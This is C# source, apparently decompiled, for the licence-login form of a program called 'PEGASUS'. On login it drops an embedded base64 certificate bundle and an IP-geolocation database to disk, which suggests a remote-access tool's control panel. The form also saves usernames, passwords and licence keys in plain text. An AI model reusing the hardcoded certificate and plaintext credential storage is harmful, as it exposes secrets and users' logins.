using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Pegasus;
using PEGASUS.Properties;

namespace PEGASUS.Forms
{

	public class Login : Form
	{
		private static string name;

		private static string ownerid;

		private static string secret;

		private static string version;

		public static api KeyAuthApp;

		public string Key = string.Empty;

		public string Info = string.Empty;

		private IContainer components;

		private Label label1;

		private Label label2;

		public Guna2GradientButton UpgradeBtn;

		public Guna2GradientButton LicBtn;

		public Guna2GradientButton RgstrBtn;

		public Guna2GradientButton LoginBtn;

		private Guna2TextBox key;

		private Guna2TextBox password;

		private Guna2TextBox username;

		private PictureBox pictureBox1;

		private Guna2Panel guna2Panel1;

		private Guna2PictureBox guna2PictureBox1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2Separator guna2Separator1;

		private Guna2CheckBox chkSave;

		private Guna2PictureBox guna2PictureBox2;

		private Guna2HtmlToolTip guna2HtmlToolTip1;

		public Login()
		{
			InitializeComponent();
		}

		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		private void Login_Load(object sender, EventArgs e)
		{
			KeyAuthApp.init();
			if (File.Exists(Application.StartupPath + "\\Configuration\\LoginRememberMe.ini"))
			{
				using StreamReader streamReader = new StreamReader(Application.StartupPath + "\\Configuration\\LoginRememberMe.ini");
				if (streamReader.ReadToEnd().Contains("|"))
				{
					string text = File.ReadAllText(Application.StartupPath + "\\Configuration\\LoginRememberMe.ini");
					Info = text.Split('|')[0];
					Key = text.Split('|')[1];
					key.Text = Key;
					LicBtn_Click(sender, e);
				}
				streamReader.Dispose();
			}
			if (KeyAuthApp.checkblack())
			{
				Environment.Exit(0);
			}
		}

		private void UpgradeBtn_Click(object sender, EventArgs e)
		{
			KeyAuthApp.upgrade(username.Text, key.Text);
		}

		private void LoginBtn_Click(object sender, EventArgs e)
		{
			if (chkSave.Checked)
			{
				if (!File.Exists(Application.StartupPath + "\\Configuration"))
				{
					Directory.CreateDirectory(Application.StartupPath + "\\Configuration");
				}
				string contents = username.Text + "|" + password.Text + "|" + key.Text;
				File.WriteAllText(Application.StartupPath + "\\Configuration\\LoginRememberMe.ini", contents);
			}
			KeyAuthApp.login(username.Text, password.Text);
			checkfiles();
			Hide();
		}

		private void RgstrBtn_Click(object sender, EventArgs e)
		{
			if (chkSave.Checked)
			{
				if (!File.Exists(Application.StartupPath + "\\Configuration"))
				{
					Directory.CreateDirectory(Application.StartupPath + "\\Configuration");
				}
				string contents = username.Text + "|" + password.Text + "|" + key.Text;
				File.WriteAllText(Application.StartupPath + "\\Configuration\\LoginRememberMe.ini", contents);
			}
			KeyAuthApp.register(username.Text, password.Text, key.Text);
			checkfiles();
			Hide();
		}

		public void checkfiles()
		{
			byte[] bytes = Convert.FromBase64String("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");
			File.WriteAllBytes(Settings.CertificatePath, bytes);
			string path = Path.Combine(Application.StartupPath, "Plugins");
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (!File.Exists(Path.Combine(Application.StartupPath, "Plugins\\ip2region.db")))
			{
				File.WriteAllBytes(Path.Combine(Application.StartupPath, "Plugins\\ip2region.db"), Resources.ip2region);
			}
		}

		private void LicBtn_Click(object sender, EventArgs e)
		{
			if (chkSave.Checked)
			{
				if (!File.Exists(Application.StartupPath + "\\Configuration"))
				{
					Directory.CreateDirectory(Application.StartupPath + "\\Configuration");
				}
				string contents = "Key|" + key.Text;
				File.WriteAllText(Application.StartupPath + "\\Configuration\\LoginRememberMe.ini", contents);
			}
			KeyAuthApp.license(key.Text);
			checkfiles();
			Hide();
		}

		private void guna2PictureBox1_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Login));
			label1 = new System.Windows.Forms.Label();
			label2 = new System.Windows.Forms.Label();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
			guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
			username = new Guna.UI2.WinForms.Guna2TextBox();
			password = new Guna.UI2.WinForms.Guna2TextBox();
			key = new Guna.UI2.WinForms.Guna2TextBox();
			LoginBtn = new Guna.UI2.WinForms.Guna2GradientButton();
			RgstrBtn = new Guna.UI2.WinForms.Guna2GradientButton();
			LicBtn = new Guna.UI2.WinForms.Guna2GradientButton();
			UpgradeBtn = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			chkSave = new Guna.UI2.WinForms.Guna2CheckBox();
			guna2PictureBox2 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2HtmlToolTip1 = new Guna.UI2.WinForms.Guna2HtmlToolTip();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			guna2Panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox2).BeginInit();
			SuspendLayout();
			label1.AutoSize = true;
			label1.Font = new System.Drawing.Font("Segoe UI Light", 10f);
			label1.ForeColor = System.Drawing.Color.White;
			label1.Location = new System.Drawing.Point(-1, 146);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(0, 19);
			label1.TabIndex = 22;
			label2.AutoSize = true;
			label2.BackColor = System.Drawing.Color.Transparent;
			label2.Font = new System.Drawing.Font("Electrolize", 11.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label2.ForeColor = System.Drawing.Color.LightGray;
			label2.Location = new System.Drawing.Point(279, 28);
			label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(148, 18);
			label2.TabIndex = 27;
			label2.Text = "PEGASUS | LOGIN";
			guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(674, 17);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
			guna2PictureBox1.Size = new System.Drawing.Size(29, 29);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox1.TabIndex = 116;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
			pictureBox1.BackColor = System.Drawing.Color.Transparent;
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(12, 12);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(40, 50);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox1.TabIndex = 115;
			pictureBox1.TabStop = false;
			guna2Panel1.Controls.Add(guna2Separator1);
			guna2Panel1.Controls.Add(guna2PictureBox1);
			guna2Panel1.Controls.Add(label2);
			guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
			guna2Panel1.Location = new System.Drawing.Point(0, 0);
			guna2Panel1.Name = "guna2Panel1";
			guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
			guna2Panel1.Size = new System.Drawing.Size(715, 78);
			guna2Panel1.TabIndex = 117;
			guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
			guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2Separator1.BackColor = System.Drawing.Color.Transparent;
			guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2Separator1.Location = new System.Drawing.Point(-210, 72);
			guna2Separator1.Name = "guna2Separator1";
			guna2Separator1.Size = new System.Drawing.Size(1137, 10);
			guna2Separator1.TabIndex = 117;
			guna2Separator1.UseTransparentBackground = true;
			username.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			username.Cursor = System.Windows.Forms.Cursors.IBeam;
			username.DefaultText = "";
			username.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			username.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			username.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			username.DisabledState.Parent = username;
			username.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			username.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			username.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			username.FocusedState.Parent = username;
			username.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			username.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			username.HoverState.Parent = username;
			username.Location = new System.Drawing.Point(135, 154);
			username.Name = "username";
			username.PasswordChar = '\0';
			username.PlaceholderText = "Username";
			username.SelectedText = "";
			username.ShadowDecoration.Parent = username;
			username.Size = new System.Drawing.Size(432, 21);
			username.TabIndex = 147;
			username.Visible = false;
			password.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			password.Cursor = System.Windows.Forms.Cursors.IBeam;
			password.DefaultText = "dark";
			password.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			password.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			password.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			password.DisabledState.Parent = password;
			password.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			password.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			password.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			password.FocusedState.Parent = password;
			password.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			password.ForeColor = System.Drawing.Color.LightGray;
			password.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			password.HoverState.Parent = password;
			password.Location = new System.Drawing.Point(135, 181);
			password.Name = "password";
			password.PasswordChar = '*';
			password.PlaceholderForeColor = System.Drawing.Color.LightGray;
			password.PlaceholderText = "Password";
			password.SelectedText = "";
			password.SelectionStart = 4;
			password.ShadowDecoration.Parent = password;
			password.Size = new System.Drawing.Size(432, 21);
			password.TabIndex = 148;
			password.Visible = false;
			key.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			key.Cursor = System.Windows.Forms.Cursors.IBeam;
			key.DefaultText = "";
			key.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			key.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			key.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			key.DisabledState.Parent = key;
			key.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			key.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			key.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			key.FocusedState.Parent = key;
			key.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			key.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			key.HoverState.Parent = key;
			key.Location = new System.Drawing.Point(135, 208);
			key.Name = "key";
			key.PasswordChar = '\0';
			key.PlaceholderText = "License";
			key.SelectedText = "";
			key.ShadowDecoration.Parent = key;
			key.Size = new System.Drawing.Size(432, 21);
			key.TabIndex = 161;
			LoginBtn.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			LoginBtn.BorderThickness = 1;
			LoginBtn.CheckedState.Parent = LoginBtn;
			LoginBtn.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			LoginBtn.CustomImages.Parent = LoginBtn;
			LoginBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			LoginBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			LoginBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			LoginBtn.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			LoginBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			LoginBtn.DisabledState.Parent = LoginBtn;
			LoginBtn.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			LoginBtn.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			LoginBtn.Font = new System.Drawing.Font("Electrolize", 9f);
			LoginBtn.ForeColor = System.Drawing.Color.White;
			LoginBtn.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			LoginBtn.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			LoginBtn.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			LoginBtn.HoverState.ForeColor = System.Drawing.Color.LightGray;
			LoginBtn.HoverState.Parent = LoginBtn;
			LoginBtn.Location = new System.Drawing.Point(421, 321);
			LoginBtn.Name = "LoginBtn";
			LoginBtn.ShadowDecoration.Parent = LoginBtn;
			LoginBtn.Size = new System.Drawing.Size(132, 30);
			LoginBtn.TabIndex = 162;
			LoginBtn.Text = "Login";
			LoginBtn.Visible = false;
			LoginBtn.Click += new System.EventHandler(LoginBtn_Click);
			RgstrBtn.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			RgstrBtn.BorderThickness = 1;
			RgstrBtn.CheckedState.Parent = RgstrBtn;
			RgstrBtn.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			RgstrBtn.CustomImages.Parent = RgstrBtn;
			RgstrBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			RgstrBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			RgstrBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			RgstrBtn.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			RgstrBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			RgstrBtn.DisabledState.Parent = RgstrBtn;
			RgstrBtn.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			RgstrBtn.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			RgstrBtn.Font = new System.Drawing.Font("Electrolize", 9f);
			RgstrBtn.ForeColor = System.Drawing.Color.White;
			RgstrBtn.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			RgstrBtn.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			RgstrBtn.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			RgstrBtn.HoverState.ForeColor = System.Drawing.Color.LightGray;
			RgstrBtn.HoverState.Parent = RgstrBtn;
			RgstrBtn.Location = new System.Drawing.Point(571, 321);
			RgstrBtn.Name = "RgstrBtn";
			RgstrBtn.ShadowDecoration.Parent = RgstrBtn;
			RgstrBtn.Size = new System.Drawing.Size(132, 30);
			RgstrBtn.TabIndex = 163;
			RgstrBtn.Text = "Register";
			RgstrBtn.Visible = false;
			RgstrBtn.Click += new System.EventHandler(RgstrBtn_Click);
			LicBtn.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			LicBtn.BorderThickness = 1;
			LicBtn.CheckedState.Parent = LicBtn;
			LicBtn.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			LicBtn.CustomImages.Parent = LicBtn;
			LicBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			LicBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			LicBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			LicBtn.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			LicBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			LicBtn.DisabledState.Parent = LicBtn;
			LicBtn.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			LicBtn.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			LicBtn.Font = new System.Drawing.Font("Electrolize", 9f);
			LicBtn.ForeColor = System.Drawing.Color.White;
			LicBtn.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			LicBtn.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			LicBtn.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			LicBtn.HoverState.ForeColor = System.Drawing.Color.LightGray;
			LicBtn.HoverState.Parent = LicBtn;
			LicBtn.Location = new System.Drawing.Point(435, 235);
			LicBtn.Name = "LicBtn";
			LicBtn.ShadowDecoration.Parent = LicBtn;
			LicBtn.Size = new System.Drawing.Size(132, 30);
			LicBtn.TabIndex = 164;
			LicBtn.Text = "Login with License";
			guna2HtmlToolTip1.SetToolTip(LicBtn, "Login with current valid  key!");
			LicBtn.Click += new System.EventHandler(LicBtn_Click);
			UpgradeBtn.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			UpgradeBtn.BorderThickness = 1;
			UpgradeBtn.CheckedState.Parent = UpgradeBtn;
			UpgradeBtn.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			UpgradeBtn.CustomImages.Parent = UpgradeBtn;
			UpgradeBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			UpgradeBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			UpgradeBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			UpgradeBtn.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			UpgradeBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			UpgradeBtn.DisabledState.Parent = UpgradeBtn;
			UpgradeBtn.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			UpgradeBtn.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			UpgradeBtn.Font = new System.Drawing.Font("Electrolize", 9f);
			UpgradeBtn.ForeColor = System.Drawing.Color.White;
			UpgradeBtn.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			UpgradeBtn.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			UpgradeBtn.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			UpgradeBtn.HoverState.ForeColor = System.Drawing.Color.LightGray;
			UpgradeBtn.HoverState.Parent = UpgradeBtn;
			UpgradeBtn.Location = new System.Drawing.Point(295, 235);
			UpgradeBtn.Name = "UpgradeBtn";
			UpgradeBtn.ShadowDecoration.Parent = UpgradeBtn;
			UpgradeBtn.Size = new System.Drawing.Size(132, 30);
			UpgradeBtn.TabIndex = 165;
			UpgradeBtn.Text = "Upgrade Key";
			guna2HtmlToolTip1.SetToolTip(UpgradeBtn, "Use this option only if your key has expired and you have buy a new one!");
			UpgradeBtn.Click += new System.EventHandler(UpgradeBtn_Click);
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.TargetForm = this;
			chkSave.AutoSize = true;
			chkSave.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			chkSave.CheckedState.BorderRadius = 0;
			chkSave.CheckedState.BorderThickness = 1;
			chkSave.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			chkSave.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
			chkSave.Font = new System.Drawing.Font("Electrolize", 8.249999f);
			chkSave.Location = new System.Drawing.Point(135, 247);
			chkSave.Name = "chkSave";
			chkSave.Size = new System.Drawing.Size(79, 18);
			chkSave.TabIndex = 166;
			chkSave.Text = "Save Login";
			chkSave.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			chkSave.UncheckedState.BorderRadius = 0;
			chkSave.UncheckedState.BorderThickness = 1;
			chkSave.UncheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2PictureBox2.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox2.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox2.Image");
			guna2PictureBox2.ImageRotate = 0f;
			guna2PictureBox2.Location = new System.Drawing.Point(125, 120);
			guna2PictureBox2.Name = "guna2PictureBox2";
			guna2PictureBox2.ShadowDecoration.Parent = guna2PictureBox2;
			guna2PictureBox2.Size = new System.Drawing.Size(89, 82);
			guna2PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox2.TabIndex = 167;
			guna2PictureBox2.TabStop = false;
			guna2PictureBox2.UseTransparentBackground = true;
			guna2HtmlToolTip1.AllowLinksHandling = true;
			guna2HtmlToolTip1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2HtmlToolTip1.BorderColor = System.Drawing.Color.FromArgb(198, 25, 31);
			guna2HtmlToolTip1.MaximumSize = new System.Drawing.Size(0, 0);
			guna2HtmlToolTip1.TitleFont = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			guna2HtmlToolTip1.TitleForeColor = System.Drawing.Color.FromArgb(198, 25, 31);
			guna2HtmlToolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
			guna2HtmlToolTip1.ToolTipTitle = "PEGASUS";
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			AutoValidate = System.Windows.Forms.AutoValidate.Disable;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			BackgroundImage = (System.Drawing.Image)resources.GetObject("$this.BackgroundImage");
			BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			base.ClientSize = new System.Drawing.Size(715, 363);
			base.Controls.Add(guna2PictureBox2);
			base.Controls.Add(chkSave);
			base.Controls.Add(UpgradeBtn);
			base.Controls.Add(LicBtn);
			base.Controls.Add(RgstrBtn);
			base.Controls.Add(LoginBtn);
			base.Controls.Add(key);
			base.Controls.Add(password);
			base.Controls.Add(username);
			base.Controls.Add(pictureBox1);
			base.Controls.Add(label1);
			base.Controls.Add(guna2Panel1);
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ForeColor = System.Drawing.Color.LightGray;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Login";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Loader";
			base.TopMost = true;
			base.TransparencyKey = System.Drawing.Color.Maroon;
			base.Load += new System.EventHandler(Login_Load);
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			guna2Panel1.ResumeLayout(false);
			guna2Panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox2).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}

		static Login()
		{
			name = "";
			ownerid = "";
			secret = "";
			version = "";
			KeyAuthApp = new api(name, ownerid, secret, version);
		}
	}
}